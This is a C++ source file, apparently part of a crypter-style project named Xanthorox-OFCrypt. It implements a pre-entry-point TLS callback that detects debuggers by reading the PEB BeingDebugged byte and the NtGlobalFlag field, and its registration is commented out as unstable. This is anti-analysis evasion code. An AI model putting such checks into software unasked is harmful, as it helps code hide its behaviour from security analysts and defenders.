//
//  Xanthorox-OFCrypt | Copyright (c) 2024-2026 Gary Senderson
//  Company: Xanthorox | All rights reserved. See LICENSE.
//

#include "TlsCallback.h"
#include <intrin.h>

// ─── Global flag set by TLS callback ───
volatile LONG g_TlsCallbackRan = 0;

// ─── TLS callback — executes BEFORE WinMain ───
// Minimal PEB-based anti-debug: no ntdll export walking,
// no KnownDlls mapping — safe in TLS context with /NODEFAULTLIB.
static void NTAPI TlsCallbackFunc(PVOID DllHandle, DWORD Reason, PVOID Reserved)
{
    if (Reason != DLL_PROCESS_ATTACH) return;

#ifdef _WIN64
    // PEB is always valid in TLS context — kernel sets it up before
    // any user-mode code, including TLS callbacks.
    unsigned __int64 pebAddr = __readgsqword(0x60);

    // ── BeingDebugged check (PEB+0x02) ──
    if (*(unsigned char*)(pebAddr + 0x02))
        return;

    // ── NtGlobalFlag check (PEB+0xBC on x64) ──
    // Debugger creates process with FLG_HEAP_ flags (0x70)
    unsigned int ntGlobalFlag = *(unsigned int*)(pebAddr + 0xBC);
    if (ntGlobalFlag & 0x70)
        return;
#else
    if (IsDebuggerPresent())
        return;
#endif

    InterlockedExchange(&g_TlsCallbackRan, 1);
}

// ─── Register TLS callback via linker ───
// Disabled: causes crash with /NODEFAULTLIB + /ENTRY:WinMain on some systems.
// The OS loader processes TLS callbacks before the entry point, but without
// CRT the TLS index management may be incomplete. Re-enable after testing.
/*
static const LONG _tls_index_val = 0;

static const PIMAGE_TLS_CALLBACK _tls_callback_array[] = {
    TlsCallbackFunc,
    nullptr
};

#pragma data_seg(".rdata$T")
extern "C" const IMAGE_TLS_DIRECTORY64 _tls_used = {
    0,                              // StartAddressOfRawData
    0,                              // EndAddressOfRawData
    (ULONG_PTR)&_tls_index_val,     // AddressOfIndex
    (ULONG_PTR)_tls_callback_array, // AddressOfCallBacks
    0,                              // SizeOfZeroFill
    0                               // Characteristics
};
#pragma data_seg()

#ifdef _WIN64
    #pragma comment(linker, "/INCLUDE:_tls_used")
#else
    #pragma comment(linker, "/INCLUDE:__tls_used")
#endif
*/

namespace TlsCallbackLoader
{
    bool Init()
    {
        // Returns true if TLS callback ran successfully.
        // Caller decides what to do — no __fastfail.
        // If callback detected a debugger, g_TlsCallbackRan stays 0.
        return InterlockedCompareExchange(&g_TlsCallbackRan, 0, 0) != 0;
    }
}
